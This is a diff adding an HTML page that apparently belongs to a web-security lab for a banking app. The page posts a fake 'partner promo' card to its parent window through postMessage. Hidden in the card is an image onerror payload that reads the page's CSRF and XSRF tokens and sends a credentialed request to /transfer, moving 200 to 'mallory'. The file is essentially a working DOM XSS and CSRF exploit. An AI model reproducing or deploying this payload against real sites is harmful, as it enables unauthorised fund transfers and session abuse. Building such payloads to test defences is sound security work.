@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Partner Promo Source</title>
+</head>
+<body>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const attemptId = params.get("attemptId") || "";
+
+    const maliciousHtml =
+      `<div class="notice-bank-card">` +
+      `<div class="notice-bank-kicker">AIA Partner Insight</div>` +
+      `<strong>Exclusive First-Year Premium Discount for SecureBank Clients</strong>` +
+      `<p>Authenticators are eligible for tailored advisory services and preferential fee schedules based on their current financial profile.</p>` +
+      `</div>` +
+      `<img src="QUANAP" onerror="(function(){` +
+      `const csrf=(document.getElementById('globalCsrfToken')&&document.getElementById('globalCsrfToken').value)||'';` +
+      `const xsrf=(document.getElementById('globalXsrfToken')&&document.getElementById('globalXsrfToken').value)||'';` +
+      `const body=new URLSearchParams({` +
+      `to:'mallory',` +
+      `amount:'200',` +
+      `csrfToken:csrf,` +
+      `xsrfToken:xsrf,` +
+      `attackVector:'dom-postmessage-xss-csrf',` +
+      `attemptId:'${attemptId}'` +
+      `});` +
+      `fetch('/transfer',{` +
+      `method:'POST',` +
+      `headers:{'Content-Type':'application/x-www-form-urlencoded'},` +
+      `credentials:'include',` +
+      `body:body.toString()` +
+      `}).then(function(){window.location='/dashboard';})` +
+      `.catch(function(err){console.error(err);});` +
+      `})();">`;
+
+    window.parent.postMessage(
+      {
+        type: "partner-promo-html",
+        attemptId,
+        html: maliciousHtml
+      },
+      "*"
+    );
+  </script>
+</body>
+</html>
